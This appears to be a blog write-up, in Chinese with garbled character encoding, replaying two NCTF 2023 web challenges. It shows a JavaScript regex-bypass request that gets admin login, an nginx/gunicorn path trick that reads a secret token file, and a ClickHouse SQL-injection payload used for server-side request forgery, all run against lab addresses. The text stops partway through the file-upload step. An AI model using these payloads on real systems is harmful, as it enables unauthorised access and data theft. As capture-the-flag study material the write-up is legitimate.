

<!DOCTYPE html>
<html lang="en">
<head>
  


<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>2023NCTF webå¤ç° daem0nu</title>


    <meta name="author" content="daem0nu">





  <link rel="alternate" href="/atom.xml " title="daem0nu" type="application/atom+xml">


  
    <link rel="stylesheet" href="/css/main.css">

  

<meta name="generator" content="Hexo 7.0.0"></head>
  <body data-theme="light" class="notransition">
    <script>
      const body = document.body;
      const data = body.getAttribute("data-theme");
      const initTheme = (state) => {
        if (state === "dark") {
          body.setAttribute("data-theme", "dark");
        } else if (state === "light") {
          body.removeAttribute("data-theme");
        } else {
          localStorage.setItem("theme", data);
        }
      };
   
      initTheme(localStorage.getItem("theme"));
      
      setTimeout(() => body.classList.remove("notransition"), 75);
    </script>
  <div class="navbar" role="navigation">
    <nav class="menu">
      <input type="checkbox" id="menu-trigger" class="menu-trigger" />
      <label for="menu-trigger">
        <span class="menu-icon">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 512 512"
          >
            <path
              d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z"
            />
          </svg>
        </span>
      </label>
      <a id="mode">
        <svg
          class="mode-sunny"
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 512 512"
        >
          <title>LIGHT</title>
          <line
            x1="256"
            y1="48"
            x2="256"
            y2="96"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="256"
            y1="416"
            x2="256"
            y2="464"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="108.92"
            x2="369.14"
            y2="142.86"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="369.14"
            x2="108.92"
            y2="403.08"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="464"
            y1="256"
            x2="416"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="96"
            y1="256"
            x2="48"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="403.08"
            x2="369.14"
            y2="369.14"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="142.86"
            x2="108.92"
            y2="108.92"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <circle
            cx="256"
            cy="256"
            r="80"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
        </svg>
        <svg
          class="mode-moon"
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 512 512"
        >
          <title>DARK</title>
          <line
            x1="256"
            y1="48"
            x2="256"
            y2="96"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="256"
            y1="416"
            x2="256"
            y2="464"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="108.92"
            x2="369.14"
            y2="142.86"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="369.14"
            x2="108.92"
            y2="403.08"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="464"
            y1="256"
            x2="416"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="96"
            y1="256"
            x2="48"
            y2="256"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="403.08"
            y1="403.08"
            x2="369.14"
            y2="369.14"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <line
            x1="142.86"
            y1="142.86"
            x2="108.92"
            y2="108.92"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
          <circle
            cx="256"
            cy="256"
            r="80"
            style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px"
          />
        </svg>
      </a>
      <div class="trigger">
        <div class="trigger-container">
          
            
            
            
            
            
            
            <a class="menu-link " href="/"> Home</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/about/"> About</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/archives/"> Archives</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/categories/"> Categories</a>
          
            
            
            
            
            
            
            <a class="menu-link " href="/tags/"> Tags</a>
          
        </div>
      </div>
    </nav>
  </div>
  
<div class="wrapper post">
  <main class="page-content" aria-label="Content">
      <header class="header">
        
        <h1 class="header-title" itemprop="headline">2023NCTF webå¤ç°</h1>
          <div class="post-meta">
            <time>Jan 04, 2024</time>
            <span itemprop="author">
              <span itemprop="name">daem0nu</span>
            </span>
          </div>
        </header>

          <div class="page-content"><h1 id="2023-NCTF-Webå¤ç°"><a href="#2023-NCTF-Webå¤ç°" class="headerlink" title="2023 NCTF Webå¤ç°"></a>2023 NCTF Webå¤ç°</h1><h2 id="1-Wait-What"><a href="#1-Wait-What" class="headerlink" title="1.Wait-What"></a>1.Wait-What</h2><p>ç¬¬ä¸€å¤„waféœ€è¦æˆ‘ä»¬æ­£åˆ™ç»•è¿‡<code>/^hacker$|^admin$/g</code>,<code>let test1 = banned_users_regex.test(username)</code>,å…¶ä¸­<code>banned_users_regex</code>çš„å€¼å³<code>/^hacker$|^admin$/g</code>ï¼Œè€Œusernameéœ€è¦ä¸ºadminæ‰èƒ½è·å–flagï¼Œä¸€å¼€å§‹æˆ‘å°è¯•äº†<code>admin\u000a</code>,å³ä½¿èƒ½ç»•è¿‡ç¬¬ä¸€å¤„wafï¼Œç”šè‡³ç¬¬äºŒå¤„wafï¼Œä½†æ˜¯ä¸‹é¢è¿™éƒ¨åˆ†å°±æ— æ³•é€šè¿‡  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; users[username] === password) &#123;<br>    <span class="hljs-title function_">next</span>()<br>    <span class="hljs-keyword">return</span><br>&#125;<br>res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ï¼Œé‰´æƒå¤±è´¥ï¼&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>å…¶å®æˆ‘çš„å°è¯•å°±ç›¸å½“äº</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a=<span class="hljs-string">&quot;admin\n&quot;</span>;<br><span class="hljs-string">&quot;admin&quot;</span> === a<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
<p>ç„¶åæŸ¥é˜…<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp/lastIndex">RegExpæ–‡æ¡£</a>ï¼Œå‘ç°RegExpåœ¨æ­£åˆ™å‡ºç°&#x2F;gæ—¶ä¼šæœ‰lastIndexå±æ€§,æè¿°å¦‚ä¸‹</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/RegExp.jpg" class="">  
<p>æœ¬åœ°æµ‹è¯•ä¸€ä¸‹å°±æ˜¯  </p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/admintest.jpg" class="">
<p>åˆ°è¿™é‡Œæ˜¯ä¸æ˜¯å°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨adminç™»å…¥ä¸¤æ¬¡å°±èƒ½ç»•è¿‡è¿™ä¸ªæ­£åˆ™ï¼Ÿï¼Œå…¶å®ä¸æ˜¯ï¼Œæºç é‡Œé¢æœ‰ä¸ªå¾ˆå…³é”®çš„æ“ä½œ,æˆ‘ä»¬åœ¨ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ï¼ŒRegExpå¯¹è±¡åˆè¢«é‡æ–°è®¾ç½®äº†ä¸€éï¼Œä¹Ÿå°±æ˜¯lastIndexåˆå›å½’0äº†  </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// æ¯æ¬¡è¯·æ±‚å‰ï¼Œæ›´æ–°å°ç¦ç”¨æˆ·æ­£åˆ™ä¿¡æ¯</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">build_banned_users_regex</span>()<br>		<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;å°ç¦ç”¨æˆ·æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ»¡è¶³è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æˆ·åä¸ºè¢«å°ç¦ç”¨æˆ·åï¼‰ï¼š&quot;</span>,banned_users_regex)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br><span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br>	<span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br>    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)<br>    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæˆ‘ä»¬èƒ½ä¸èƒ½è®©å®ƒä¸æ‰§è¡Œé‚£ä¸ª<code>build_banned_users_regex()</code>å‡½æ•°ï¼Œæƒ³é˜»æ­¢å®ƒæ‰§è¡Œå°±éœ€è¦äº§ç”Ÿé”™è¯¯ï¼Œä¸‹é¢æˆ‘ä»¬çœ‹çœ‹é”™è¯¯jsçš„é”™è¯¯æœºåˆ¶æ˜¯æ€ä¹ˆæ ·çš„,æˆ‘ä»¬ä»¿é€ é¢˜ç›®çš„æ ·å­ï¼Œåˆ¶é€ äº†ä¸€ä¸ªæœ‰é”™è¯¯å’Œæ²¡é”™è¯¯çš„æµ‹è¯•,å‘ç°å‘ç”Ÿé”™è¯¯æ—¶1234567æ— æ³•è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´å½“æœ‰catchå­˜åœ¨æ—¶ï¼Œå‘ç”Ÿerrorå¤„ä¹‹åçš„ä»£ç éƒ½ä¸ä¼šæ‰§è¡Œäº†    </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;oops&quot;</span>)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;1234567&quot;</span>)<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">b</span>()<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;b() has error&quot;</span>)<br>&#125;<br><span class="hljs-comment">//è¿è¡Œç»“æœï¼šb() has error</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//throw new Error(&quot;oops&quot;)</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;1234567&quot;</span>)<br>&#125;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">b</span>()<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;b() has error&quot;</span>)<br>&#125;<br><span class="hljs-comment">//è¿è¡Œç»“æœï¼š1234567</span><br><br><span class="hljs-string">``</span><span class="hljs-string">`  </span><br><span class="hljs-string"></span><br><span class="hljs-string">è€Œé¢˜ç›®å½“ä¸­åˆšå¥½æœ‰è¿™æ ·ä¸€å¤„,`</span>escapeRegExp(username)<span class="hljs-string">`ä½äº`</span>banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<span class="hljs-string">`ä¹‹å‰ï¼Œå¦‚æœèƒ½åœ¨å…¶ä¸­åˆ¶é€ ä¸€ä¸ªé”™è¯¯ï¼Œæˆ‘ä»¬å°±èƒ½è§„é¿RegExpå¯¹è±¡çš„é‡ç½®</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>js<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br><span class="hljs-string">``</span><span class="hljs-string">`  </span><br><span class="hljs-string">è§‚å¯Ÿåˆ°`</span>escapeRegExp(string)<span class="hljs-string">`çš„stringæ¥æºäºusernameï¼Œè€Œusernameæ¥æºäºbanned_users</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>js<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><br><span class="hljs-string">``</span><span class="hljs-string">`  </span><br><span class="hljs-string">çœ‹çœ‹banned_usersæ˜¯å¦‚ä½•äº§ç”Ÿçš„,æƒ³è¦åˆ¶é€ é”™è¯¯ï¼Œæˆ‘ä»¬åº”è¯¥è®©ä¼ å…¥çš„usernameä¸èƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œè€Œè¿™ä¸ªæ¥å£åˆšå¥½æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ç±»å‹&#123;&quot;asd&quot;:1&#125;å°±èƒ½å‡ºå‘ä¸Šè¿°çš„é”™è¯¯ï¼Œè¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„</span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>js<br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_usernameä¸èƒ½ä¸ºç©º&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ä¸èƒ½å°ç¦è‡ªå·±&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ç”¨æˆ·å·²ç»è¢«å°ç¦&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;å°ç¦æˆåŠŸï¼&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥æ˜¯wafäºŒ,wafå¢åŠ äº†adminçš„é™åˆ¶ï¼Œæ‰€ä»¥<code>banned_users = [&#39;hacker&#39;,&#39;admin&#39;]</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">let banned_users = [&#x27;hacker&#x27;]<br>let test2 = (username in banned_users)<br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹çœ‹<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">in</a>æ“ä½œç¬¦æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œä¾æ®æ–‡æ¡£æˆ‘ä»¬æµ‹è¯•å¦‚ä¸‹ï¼Œå‘ç°ç¡®å®å¦‚æ–‡æ¡£æ‰€è¯´inåªèƒ½åˆ¤æ–­é”®æ˜¯å¦å­˜åœ¨ï¼Œè€Œæ— æ³•åˆ¤æ–­å¯¹åº”å€¼æ˜¯å¦å­˜åœ¨ï¼Œåˆ°æ­¤ä¼¼ä¹æˆ‘ä»¬ç›´æ¥ä»¤<code>username=admin</code>å³å¯ç»•è¿‡waf2</p>
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/in.jpg" class="">
<img src="/2024/01/04/2023NCTF-web%E5%A4%8D%E7%8E%B0/list.jpg" class="">

<p>æœ€ç»ˆpayloadå¦‚ä¸‹,ç„¶åç›´æ¥<code>username=admin,password=admin</code>è®¿é—®flagé¡µé¢å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /api/ban_user HTTP/1.1<br>Host: 10.0.0.129:8082<br>Content-Type: application/json<br>Accept-Language: zh-CN,zh;q=0.9<br>Referer: http://10.0.0.129:8082/<br>Origin: http://10.0.0.129:8082<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36<br>Accept: */*<br>Accept-Encoding: gzip, deflate<br>Content-Length: 58<br><br>&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;,&quot;ban_username&quot;:&#123;&quot;a&quot;:1&#125;&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-Click-House"><a href="#2-Click-House" class="headerlink" title="2.Click-House"></a>2.Click-House</h2><p>å¦‚æœæˆ‘ä»¬ç›´æ¥åˆ©ç”¨nginxçš„proxyï¼Œæˆ‘ä»¬åªèƒ½è®¿é—®backendçš„<code>/api/ping</code>,<code>/api/token</code>,<code>/api/upload</code>æ¥å£ï¼Œå…¶ä¸­<code>/api/token</code>,<code>/api/upload</code>åªèƒ½ä»¥<code>172.28</code>ç½‘æ®µè®¿é—®ï¼Œåœ¨æˆ‘çš„æœ¬åœ°ç¯å¢ƒä¸­å°±æ˜¯<code>172.30</code>ç½‘æ®µæ‰èƒ½è®¿é—®</p>
<p>æ ¹æ®é¢˜ç›®çš„hintï¼Œ<a target="_blank" rel="noopener" href="http://www.hackdig.com/10/hack-524627.htm">nginx+gunicornè§£ææ¼æ´</a>,æˆ‘ä»¬å°±èƒ½è®¿é—®<code>/</code>å’Œ<code>/query</code>æ¥å£äº†ï¼Œnginx proxyè®¿é—®backend&#x2F;,å‘ç°ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼ŒæŠŠtokenè¯»äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /	HTTP/1.1/../../api/ HTTP/1.1<br>Host: 10.0.0.129:8013<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0<br><br>name=/app/.token<br><br>HTTP/1.1 200 OK<br>Server: nginx/1.21.0<br>Date: Mon, 25 Dec 2023 08:51:33 GMT<br>Connection: keep-alive<br>Content-Length: 33<br><br>bcb7e2b83fc3378ccf7c641e92ad8bf4<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥åº”è¯¥å°±è¦æƒ³åŠæ³•ä»<code>178.30</code>ç½‘æ®µè®¿é—®&#x2F;api&#x2F;uploadï¼Œå…ˆæ§åˆ¶è¿™ä¸ªæ¥å£å†è¯´ï¼Œæ–‡æ¡£ä¸­å‘ç°äº†<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/sql-reference/table-functions/url">è¡¨å‡½æ•°url</a>ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥æ„é€ ä»¥ä¸‹payloadï¼Œå¹¶ä¸”å¾—çŸ¥å¦‚æœINSERTé…åˆurl()å°†ä¼šä½¿ç”¨POSTæ–¹æ³•è®¿é—®url</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> a <span class="hljs-keyword">from</span> url(<span class="hljs-string">&#x27;http://172.30.0.3:8001/api/token&#x27;</span>,<span class="hljs-string">&#x27;CSV&#x27;</span>,<span class="hljs-string">&#x27;a String&#x27;</span>))<br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯å¾ˆé—æ†¾ï¼Œclickhouseå¹¶ä¸æ”¯æŒå †å æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>clickhouse<span class="hljs-operator">-</span>client<br><span class="hljs-number">1370e293700</span>b :) <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>;<br><br>Syntax error (Multi<span class="hljs-operator">-</span>statements <span class="hljs-keyword">are</span> <span class="hljs-keyword">not</span> allowed): failed <span class="hljs-keyword">at</span> position <span class="hljs-number">9</span> (<span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> query):<br><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>;<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure>

<p>googleæœç´¢clickhouse postæ—¶å‘ç°<a target="_blank" rel="noopener" href="https://clickhouse.com/docs/en/interfaces/http">clickhouseçš„httpæ¥å£</a>ï¼Œä»ä¸­æˆ‘ä»¬æŒ‡å®šclickhouseå¯ä»¥é€šè¿‡8123ç«¯å£è®¿é—®å…¶webUIç•Œé¢ï¼Œæœ€é‡è¦çš„æ˜¯å®ƒèƒ½å¤Ÿä½¿ç”¨queryå‚æ•°æ‰§è¡Œsqlè¯­å¥ï¼Œé‚£ä¹ˆè¿™å°±è§£å†³äº†ä¸Šé¢æ— æ³•å †å æ³¨å…¥çš„é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨url()æ¥ssrfè®¿é—®<code>http://localhost:8123/?query=select 1</code></p>
<p>ä¸‹é¢ç ”ç©¶ä¸€ä¸‹è¿™æ®µä»£ç æ˜¯å¦‚ä½•å®ç°ä¸Šä¼ åŠŸèƒ½çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">files = web.<span class="hljs-built_in">input</span>(myfile=&#123;&#125;)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;myfile&#x27;</span> <span class="hljs-keyword">in</span> files:<br>    filepath = os.path.join(<span class="hljs-string">&#x27;upload/&#x27;</span>, files.myfile.filename)<br>    <span class="hljs-keyword">if</span> (os.path.isfile(filepath)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(files.myfile.file.read())<br></code></pre></td></tr></table></figure>

<p>åœ¨ç½‘ä¸Šå‘ç°äº†<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jolin123/p/4683677.html">åŸºäºweb.pyçš„æ–‡ä»¶ä¸Šä¼ </a>ï¼Œæœ¬åœ°ä¸Šä¼ æµ‹è¯•ç¡®å®šäº†ä¸Šä¼ çš„æ•°æ®ç»“æ„ä¸º<code>multipart/form-data</code>ï¼ŒæŠ“å–çš„éƒ¨åˆ†æ•°æ®åŒ…å¦‚ä¸‹</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarytxS8SovqVYBwwSzG<br><br>------WebKitFormBoundarytxS8SovqVYBwwSzG<br><span class="hljs-attribute">Content-Disposition</span><span class="hljs-punctuation">: </span>form-data; name=&quot;myfile&quot;; filename=&quot;ban.txt&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/plain<br><br>this is a test<br>------WebKitFormBoundarytxS8SovqVYBwwSzG--<br></code></pre></td></tr></table></figure>

